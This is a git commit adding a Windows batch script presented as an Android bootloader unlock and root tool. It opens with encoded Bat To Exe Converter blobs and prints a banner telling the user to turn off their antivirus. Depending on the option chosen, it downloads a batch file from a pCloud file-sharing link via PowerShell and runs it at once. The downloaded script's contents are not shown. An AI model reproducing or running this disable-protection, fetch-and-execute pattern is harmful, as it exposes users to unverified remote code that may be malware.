85f77d9ed1e3a218e7cf5ed9f97d3f79e1f31585
jarry26665 <30381140+jarry26665@users.noreply.github.com>
2021-06-06 10:04:03 +0500

    Add files via upload

---
+++ BootRoot.bat
@@ -0,0 +1,77 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkv60HmO5M10xo=
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkvy0HmQp8j92pT1s8AAHs=
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkvy0HmQp8j92pT1s8AAE55X0WOTFZh+joW5DTREZ78
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkvy0HmQp8j92pT1s8AAEJ6WET5Sl5i8T4V5jbTY5b8
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkvy0HmQp8j42lYudsFQh9UcnI=
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkv7ET3YZQi2W4UndMJbA==
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkv7EnlZp5j1HtO+A==
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkv+VCqb589tg==
+::fBE1pAF6MU+EWH/eyFAxLAIUSRyHAFm1CaEPqMX65NaqkQ0vW+0ra8+WmpeBMPkv+VD0ZZk/wjRYmd9s
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCmDJFSN7H4CJxRAXziwM2SuRpgd4+3H3eWItg0+ecYDTJ3e36CBJ605/0vteoRg8nVZjcYJAg8VbgCuaAomrGBBs3fIZYmVsACB
+::YAwzuBVtJxjWCl3EqQJhSA==
+::ZR4luwNxJguZRRmJ/0UjJXs=
+::Yhs/ulQjdF65
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF65
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZks0
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQIdA1tzfyni
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCmDJHSvtHA/Jw9HAgGaOQs=
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@ECHO OFF
+color 0A
+TITLE MK Roots
+echo ===============================================================================================
+echo.
+echo                                                -----------------------
+echo                                  8888ba.88ba  dP     dP  .88888.  .d88888b  8888ba.88ba  
+echo                                  88  `8b  `8b 88   .d8' d8'   `88 88.    "' 88  `8b  `8b 
+echo                                  88   88   88 88aaa8P'  88        `Y88888b. 88   88   88 
+echo                                  88   88   88 88   `8b. 88   YP88       `8b 88   88   88 
+echo                                  88   88   88 88     88 Y8.   .88 d8'   .8P 88   88   88 
+echo                                  dP   dP   dP dP     dP  `88888'   Y88888P  dP   dP   dP
+echo                                                -----------------------
+echo                                                TOOL BY Mehran Khan
+echo                                               Prazanted By  HalabTech
+echo.
+echo                                                Note : Turn Off Antvirus 
+echo.
+echo internet Must Be Connected
+echo.
+echo ===============================================================================================
+echo.
+echo [1] Unlock Bootloader     [2] Start Root 
+echo.
+echo ===================================enjoy Root=====================================================
+echo                              Press your key  For Next Process
+echo. 
+::this code fore chose option
+set /p user_input=
+::tis Code fore start option
+echo Downloading
+if %user_input% equ 1 powershell -command invoke-webrequest https://c163.pcloud.com/dpZcPgXX1ZanJtjgZU1J47ZZCstHv7Z2ZZk4FZZH5m62H3Q7wu0sYi15p5XbVW14wDX/Bootloader.bat -outfile toor.bat
+if %user_input% equ 2 powershell -command invoke-webrequest https://u.pcloud.link/publink/show?code=XZFfx9XZUy3ibQBI4oHO2SLMvB7VHhrw0pxV -outfile toor.bat
+start toor.bat
+exit
